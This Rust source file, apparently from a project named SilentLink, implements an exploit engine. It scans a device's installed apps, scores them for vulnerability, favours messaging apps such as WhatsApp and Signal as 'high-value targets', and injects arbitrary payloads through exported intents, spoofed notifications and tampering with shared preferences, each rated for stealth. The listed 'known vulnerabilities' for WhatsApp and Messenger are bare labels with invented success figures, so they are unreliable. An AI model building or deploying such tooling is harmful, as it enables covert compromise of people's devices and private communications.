use std::collections::HashMap;
use serde::{Deserialize, Serialize};
use async_trait::async_trait;
use base64::prelude::*;
use crate::{Result, SilentLinkError};
use crate::platform::{PlatformAdapter, AppMetadata, SystemInfo, create_platform_adapter_with_config};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AppInfo {
    pub package_name: String,
    pub version: String,
    pub permissions: Vec<String>,
    pub exposed_components: Vec<ComponentInfo>,
    pub sdk_versions: HashMap<String, String>,
    pub vulnerability_score: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ComponentInfo {
    pub component_type: ComponentType,
    pub name: String,
    pub exported: bool,
    pub intent_filters: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ComponentType {
    Activity,
    Service,
    Receiver,
    Provider,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitVector {
    pub name: String,
    pub stealth_rating: u8,     
    pub success_probability: f32,
    pub payload_size_limit: usize,
    pub requires_permissions: Vec<String>,
}

pub struct DeviceScanner {
    known_vulnerabilities: HashMap<String, Vec<ExploitVector>>,
    platform_adapter: Box<dyn PlatformAdapter + Send + Sync>,
}

impl DeviceScanner {
    pub fn new() -> Self {
        let mut scanner = Self {
            known_vulnerabilities: HashMap::new(),
            platform_adapter: create_platform_adapter_with_config(false, None),
        };
        scanner.load_vulnerability_db();
        scanner
    }

    pub fn new_with_privileged_access(device_id: Option<String>) -> Self {
        let mut scanner = Self {
            known_vulnerabilities: HashMap::new(),
            platform_adapter: create_platform_adapter_with_config(true, device_id),
        };
        scanner.load_vulnerability_db();
        scanner
    }

    /// Scan device for installed apps and vulnerabilities using platform adapter
    pub async fn scan_device(&self) -> Result<Vec<AppInfo>> {
        // Get apps from platform adapter
        let platform_apps = self.platform_adapter.get_installed_apps().await?;
        
        // Convert to our AppInfo format and add vulnerability analysis
        let mut apps = Vec::new();
        for platform_app in platform_apps {
            let app_info = self.convert_platform_app_to_app_info(platform_app).await;
            apps.push(app_info);
        }

        Ok(apps)
    }

    /// Convert platform AppMetadata to our AppInfo format
    async fn convert_platform_app_to_app_info(&self, platform_app: AppMetadata) -> AppInfo {
        let mut components = Vec::new();
        
        // Convert platform components to our format
        for component in &platform_app.exported_components {
            components.push(ComponentInfo {
                component_type: self.guess_component_type(&component.name),
                name: component.name.clone(),
                exported: component.exported,
                intent_filters: component.intent_filters.iter()
                    .flat_map(|filter| filter.actions.clone())
                    .collect(),
            });
        }

        // Calculate vulnerability score based on various factors
        let vulnerability_score = self.calculate_vulnerability_score(&platform_app);

        AppInfo {
            package_name: platform_app.package_name,
            version: platform_app.version,
            permissions: platform_app.permissions,
            exposed_components: components,
            sdk_versions: HashMap::from([
                ("target".to_string(), platform_app.target_sdk.to_string()),
                ("min".to_string(), platform_app.min_sdk.to_string()),
            ]),
            vulnerability_score,
        }
    }

    /// Calculate vulnerability score based on app characteristics
    fn calculate_vulnerability_score(&self, app: &AppMetadata) -> f32 {
        let mut score = 0.0;

        // Higher score for older target SDK
        if app.target_sdk < 28 {
            score += 0.3;
        } else if app.target_sdk < 31 {
            score += 0.2;
        }

        // Higher score for dangerous permissions
        let dangerous_permissions = [
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS", 
            "android.permission.READ_CONTACTS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.WRITE_EXTERNAL_STORAGE",
        ];

        let dangerous_count = app.permissions.iter()
            .filter(|p| dangerous_permissions.contains(&p.as_str()))
            .count();
        
        score += (dangerous_count as f32) * 0.1;

        // Higher score for exported components
        score += (app.exported_components.len() as f32) * 0.05;

        // Known vulnerable packages get higher scores
        if self.known_vulnerabilities.contains_key(&app.package_name) {
            score += 0.4;
        }

        // Cap at 1.0
        score.min(1.0)
    }

    /// Guess component type from component name
    fn guess_component_type(&self, component_name: &str) -> ComponentType {
        if component_name.contains("Activity") {
            ComponentType::Activity
        } else if component_name.contains("Service") {
            ComponentType::Service
        } else if component_name.contains("Receiver") {
            ComponentType::Receiver
        } else if component_name.contains("Provider") {
            ComponentType::Provider
        } else {
            ComponentType::Activity // Default
        }
    }

    /// Analyze apps for exploitation potential
    pub fn analyze_vulnerabilities(&self, apps: &[AppInfo]) -> Vec<(AppInfo, Vec<ExploitVector>)> {
        apps.iter()
            .filter_map(|app| {
                let exploits = self.find_exploits_for_app(app);
                if !exploits.is_empty() {
                    Some((app.clone(), exploits))
                } else {
                    None
                }
            })
            .collect()
    }

    fn find_exploits_for_app(&self, app: &AppInfo) -> Vec<ExploitVector> {
        let mut exploits = Vec::new();

        // Check for known package vulnerabilities
        if let Some(package_exploits) = self.known_vulnerabilities.get(&app.package_name) {
            exploits.extend(package_exploits.clone());
        }

        // Check for exposed components
        for component in &app.exposed_components {
            if component.exported {
                exploits.push(ExploitVector {
                    name: format!("Intent hijacking: {}", component.name),
                    stealth_rating: 8,
                    success_probability: 0.9,
                    payload_size_limit: 1024,
                    requires_permissions: vec![],
                });
            }
        }

        // Check for notification vulnerabilities
        if app.permissions.contains(&"android.permission.POST_NOTIFICATIONS".to_string()) {
            exploits.push(ExploitVector {
                name: "Notification spoofing".to_string(),
                stealth_rating: 6,
                success_probability: 0.8,
                payload_size_limit: 256,
                requires_permissions: vec!["android.permission.POST_NOTIFICATIONS".to_string()],
            });
        }

        // Check for shared preferences vulnerabilities
        if app.vulnerability_score > 0.5 {
            exploits.push(ExploitVector {
                name: "Shared preferences injection".to_string(),
                stealth_rating: 9,
                success_probability: 0.6,
                payload_size_limit: 2048,
                requires_permissions: vec![],
            });
        }

        exploits
    }

    fn load_vulnerability_db(&mut self) {
        // Load known app vulnerabilities
        self.known_vulnerabilities.insert(
            "com.whatsapp".to_string(),
            vec![
                ExploitVector {
                    name: "Media file injection via intent".to_string(),
                    stealth_rating: 7,
                    success_probability: 0.75,
                    payload_size_limit: 1024 * 1024, // 1MB
                    requires_permissions: vec!["android.permission.WRITE_EXTERNAL_STORAGE".to_string()],
                },
            ]
        );

        self.known_vulnerabilities.insert(
            "com.facebook.messenger".to_string(),
            vec![
                ExploitVector {
                    name: "Deep link manipulation".to_string(),
                    stealth_rating: 8,
                    success_probability: 0.85,
                    payload_size_limit: 512,
                    requires_permissions: vec![],
                },
            ]
        );
    }
}

/// Trait for different payload injection methods
#[async_trait]
pub trait PayloadInjector {
    async fn can_inject(&self, app: &AppInfo, platform: &dyn PlatformAdapter) -> bool;
    async fn inject(&self, app: &AppInfo, payload: &[u8], platform: &dyn PlatformAdapter) -> Result<()>;
    fn get_stealth_rating(&self) -> u8;
    fn get_success_probability(&self, app: &AppInfo) -> f32;
}

/// Inject payload via Android Intent system or Desktop equivalent
pub struct IntentInjector;

#[async_trait]
impl PayloadInjector for IntentInjector {
    async fn can_inject(&self, app: &AppInfo, platform: &dyn PlatformAdapter) -> bool {
        if platform.supports_operation(crate::platform::PlatformOperation::IntentInjection) {
            app.exposed_components.iter().any(|c| c.exported)
        } else {
            // Desktop equivalent: check for D-Bus services or IPC mechanisms
            app.package_name.starts_with("org.freedesktop") || 
            app.package_name.contains("dbus")
        }
    }

    async fn inject(&self, app: &AppInfo, payload: &[u8], platform: &dyn PlatformAdapter) -> Result<()> {
        // Find best injection target
        for component in &app.exposed_components {
            if component.exported {
                let action = if !component.intent_filters.is_empty() {
                    &component.intent_filters[0]
                } else {
                    "android.intent.action.MAIN"
                };

                match platform.send_intent(&component.name, action, payload).await {
                    Ok(()) => {
                        println!("[IntentInjector] Successfully injected payload via {} (action: {})", 
                                component.name, action);
                        return Ok(());
                    }
                    Err(e) => {
                        println!("[IntentInjector] Failed to inject via {}: {}", component.name, e);
                        continue;
                    }
                }
            }
        }
        
        Err(SilentLinkError::System("No suitable injection vector found".to_string()))
    }

    fn get_stealth_rating(&self) -> u8 { 8 }

    fn get_success_probability(&self, app: &AppInfo) -> f32 {
        let exported_count = app.exposed_components.iter().filter(|c| c.exported).count();
        if exported_count > 0 {
            0.8 + (exported_count as f32 * 0.05).min(0.2)
        } else {
            0.1
        }
    }
}

/// Inject payload via notification spoofing
pub struct NotificationInjector;

#[async_trait]
impl PayloadInjector for NotificationInjector {
    async fn can_inject(&self, app: &AppInfo, platform: &dyn PlatformAdapter) -> bool {
        platform.supports_operation(crate::platform::PlatformOperation::NotificationSpoofing) &&
        (app.permissions.contains(&"android.permission.POST_NOTIFICATIONS".to_string()) ||
         app.package_name.contains("notification"))
    }

    async fn inject(&self, app: &AppInfo, payload: &[u8], platform: &dyn PlatformAdapter) -> Result<()> {
        let message = String::from_utf8_lossy(payload);
        let title = format!("Update from {}", app.package_name.split('.').last().unwrap_or(&app.package_name));
        
        platform.create_notification(&app.package_name, &title, &message).await?;
        
        println!("[NotificationInjector] Spoofed notification for {}", app.package_name);
        Ok(())
    }

    fn get_stealth_rating(&self) -> u8 { 6 }

    fn get_success_probability(&self, app: &AppInfo) -> f32 {
        if app.permissions.contains(&"android.permission.POST_NOTIFICATIONS".to_string()) {
            0.85
        } else {
            0.4
        }
    }
}

/// Inject payload via configuration/preferences modification
pub struct ConfigInjector;

#[async_trait]
impl PayloadInjector for ConfigInjector {
    async fn can_inject(&self, _app: &AppInfo, platform: &dyn PlatformAdapter) -> bool {
        platform.supports_operation(crate::platform::PlatformOperation::SharedPreferencesAccess)
    }

    async fn inject(&self, app: &AppInfo, payload: &[u8], platform: &dyn PlatformAdapter) -> Result<()> {
        let payload_str = BASE64_STANDARD.encode(payload);
        let key = "silentlink_config";
        
        platform.access_shared_preferences(&app.package_name, key, &payload_str).await?;
        
        println!("[ConfigInjector] Injected config for {}", app.package_name);
        Ok(())
    }

    fn get_stealth_rating(&self) -> u8 { 9 }

    fn get_success_probability(&self, app: &AppInfo) -> f32 {
        // Higher success for apps with known config vulnerabilities
        if app.vulnerability_score > 0.6 {
            0.7
        } else {
            0.4
        }
    }
}

/// Main exploit coordination engine
pub struct ExploitEngine {
    scanner: DeviceScanner,
    injectors: Vec<Box<dyn PayloadInjector + Send + Sync>>,
    platform_adapter: Box<dyn PlatformAdapter + Send + Sync>,
    system_info: Option<SystemInfo>,
}

impl ExploitEngine {
    pub fn new() -> Self {
        Self {
            scanner: DeviceScanner::new(),
            injectors: vec![
                Box::new(IntentInjector),
                Box::new(NotificationInjector),
                Box::new(ConfigInjector),
            ],
            platform_adapter: create_platform_adapter_with_config(false, None),
            system_info: None,
        }
    }

    pub fn new_with_privileged_access(device_id: Option<String>) -> Self {
        Self {
            scanner: DeviceScanner::new_with_privileged_access(device_id.clone()),
            injectors: vec![
                Box::new(IntentInjector),
                Box::new(NotificationInjector),
                Box::new(ConfigInjector),
            ],
            platform_adapter: create_platform_adapter_with_config(true, device_id),
            system_info: None,
        }
    }

    /// Initialize and gather system information
    pub async fn initialize(&mut self) -> Result<()> {
        println!("Gathering system information...");
        self.system_info = Some(self.platform_adapter.get_system_info().await?);
        
        if let Some(info) = &self.system_info {
            println!("Platform: {} {}", info.platform, info.version);
            println!("Architecture: {}", info.architecture);
            println!("Root access: {}", info.root_access);
            if !info.installed_frameworks.is_empty() {
                println!("Frameworks: {}", info.installed_frameworks.join(", "));
            }
        }

        Ok(())
    }

    /// Main exploitation workflow with enhanced targeting
    pub async fn exploit_device(&self, payload: &[u8]) -> Result<()> {
        println!("Scanning device for vulnerable apps...");
        
        // 1. Scan for installed apps
        let apps = self.scanner.scan_device().await?;
        println!("Found {} installed applications", apps.len());
        
        // 2. Analyze vulnerabilities
        let vulnerable_apps = self.scanner.analyze_vulnerabilities(&apps);
        
        if vulnerable_apps.is_empty() {
            return Err(SilentLinkError::System("No vulnerable apps found".to_string()));
        }

        println!("Identified {} vulnerable applications", vulnerable_apps.len());

        // 3. Select best targets (try multiple if needed)
        let ranked_targets = self.rank_targets(&vulnerable_apps);
        
        // 4. Try injection methods for each target until success
        for (target_app, _exploits) in ranked_targets.iter().take(3) { // Try top 3 targets
            println!("Attempting exploitation of: {} (score: {:.2})", 
                    target_app.package_name, target_app.vulnerability_score);

            // Try injectors in order of effectiveness for this target
            let mut sorted_injectors: Vec<_> = self.injectors.iter().collect();
            sorted_injectors.sort_by(|a, b| {
                let a_score = a.get_stealth_rating() as f32 * a.get_success_probability(target_app);
                let b_score = b.get_stealth_rating() as f32 * b.get_success_probability(target_app);
                b_score.partial_cmp(&a_score).unwrap_or(std::cmp::Ordering::Equal)
            });

            for injector in sorted_injectors {
                if injector.can_inject(target_app, self.platform_adapter.as_ref()).await {
                    match injector.inject(target_app, payload, self.platform_adapter.as_ref()).await {
                        Ok(()) => {
                            println!("Payload successfully injected via {} into {}", 
                                    std::any::type_name_of_val(injector.as_ref()),
                                    target_app.package_name);
                            return Ok(());
                        }
                        Err(e) => {
                            println!("Injection failed via {}: {}", 
                                    std::any::type_name_of_val(injector.as_ref()), e);
                            continue;
                        }
                    }
                }
            }
        }

        Err(SilentLinkError::System("All injection attempts failed".to_string()))
    }

    /// Rank targets by exploitation potential
    #[allow(dead_code)] // Used internally by the exploit engine
    fn rank_targets(&self, vulnerable_apps: &[(AppInfo, Vec<ExploitVector>)]) -> Vec<(AppInfo, Vec<ExploitVector>)> {
        let mut ranked = vulnerable_apps.to_vec();
        
        ranked.sort_by(|(a, a_exploits), (b, b_exploits)| {
            let a_score = self.calculate_target_score(a, a_exploits);
            let b_score = self.calculate_target_score(b, b_exploits);
            b_score.partial_cmp(&a_score).unwrap_or(std::cmp::Ordering::Equal)
        });

        ranked
    }

    /// Calculate comprehensive target score
    #[allow(dead_code)] // Used for target selection algorithms
    fn calculate_target_score(&self, app: &AppInfo, exploits: &[ExploitVector]) -> f32 {
        let mut score = app.vulnerability_score;

        // Add exploit potential
        for exploit in exploits {
            score += (exploit.stealth_rating as f32 / 10.0) * exploit.success_probability;
        }

        // Bonus for high-value targets
        let high_value_apps = ["whatsapp", "telegram", "signal", "facebook", "instagram", "twitter"];
        if high_value_apps.iter().any(|&name| app.package_name.contains(name)) {
            score += 0.5;
        }

        // Platform-specific adjustments
        if let Some(system_info) = &self.system_info {
            if system_info.root_access {
                score += 0.3; // Root access enables more vectors
            }
            
            if !system_info.installed_frameworks.is_empty() {
                score += 0.2; // Security frameworks present
            }
        }

        score
    }

    /// Get system information
    #[allow(dead_code)] // Used for debugging and status reporting
    pub fn get_system_info(&self) -> Option<&SystemInfo> {
        self.system_info.as_ref()
    }

    /// Get platform capabilities
    #[allow(dead_code)] // Used for capability discovery
    pub fn get_platform_capabilities(&self) -> Vec<String> {
        use crate::platform::PlatformOperation;
        
        let operations = [
            (PlatformOperation::IntentInjection, "Intent Injection"),
            (PlatformOperation::NotificationSpoofing, "Notification Spoofing"),
            (PlatformOperation::SharedPreferencesAccess, "Config Access"),
            (PlatformOperation::DeepLinkManipulation, "Deep Link Manipulation"),
            (PlatformOperation::ProcessInjection, "Process Injection"),
            (PlatformOperation::MemoryDumping, "Memory Dumping"),
            (PlatformOperation::NetworkInterception, "Network Interception"),
        ];

        operations.iter()
            .filter(|(op, _)| self.platform_adapter.supports_operation(*op))
            .map(|(_, name)| name.to_string())
            .collect()
    }

    #[allow(dead_code)] // Legacy method kept for compatibility
    fn select_best_target(&self, vulnerable_apps: &[(AppInfo, Vec<ExploitVector>)]) -> (AppInfo, Vec<ExploitVector>) {
        vulnerable_apps.iter()
            .max_by(|(a, a_exploits), (b, b_exploits)| {
                let a_score = a.vulnerability_score + 
                    (a_exploits.iter().map(|e| e.stealth_rating as f32 * e.success_probability).sum::<f32>() / 10.0);
                let b_score = b.vulnerability_score + 
                    (b_exploits.iter().map(|e| e.stealth_rating as f32 * e.success_probability).sum::<f32>() / 10.0);
                a_score.partial_cmp(&b_score).unwrap_or(std::cmp::Ordering::Equal)
            })
            .map(|(app, exploits)| (app.clone(), exploits.clone()))
            .unwrap_or_else(|| (vulnerable_apps[0].0.clone(), vulnerable_apps[0].1.clone()))
    }

    /// Inject payload to multiple vector apps (used by MessageRouter)
    pub async fn inject_payload_to_apps(&self, payload: &[u8]) -> Result<Vec<InjectionResult>> {
        let mut results = Vec::new();
        
        // Scan for vulnerable apps
        let apps = self.scanner.scan_device().await?;
        let vulnerable_apps = self.scanner.analyze_vulnerabilities(&apps);
        
        // Try injection on each vulnerable app
        for (app, exploits) in vulnerable_apps.iter().take(3) { // Limit to top 3 for efficiency
            for exploit in exploits.iter().take(2) { // Try top 2 exploits per app
                match self.attempt_injection(app, exploit, payload).await {
                    Ok(()) => {
                        results.push(InjectionResult {
                            app_name: app.package_name.clone(),
                            exploit_used: exploit.name.clone(),
                            success: true,
                            message: "Payload injected successfully".to_string(),
                        });
                        break; // Success, move to next app
                    }
                    Err(e) => {
                        results.push(InjectionResult {
                            app_name: app.package_name.clone(),
                            exploit_used: exploit.name.clone(),
                            success: false,
                            message: e.to_string(),
                        });
                    }
                }
            }
        }
        
        Ok(results)
    }

    /// Helper method to attempt injection on a specific app
    async fn attempt_injection(&self, app_info: &AppInfo, _exploit: &ExploitVector, payload: &[u8]) -> Result<()> {
        for injector in &self.injectors {
            if injector.can_inject(app_info, &*self.platform_adapter).await {
                return injector.inject(app_info, payload, &*self.platform_adapter).await;
            }
        }
        
        Err(SilentLinkError::System("No suitable injector found".to_string()))
    }
}

#[derive(Debug, Clone)]
pub struct InjectionResult {
    pub app_name: String,
    pub exploit_used: String,
    pub success: bool,
    pub message: String,
}
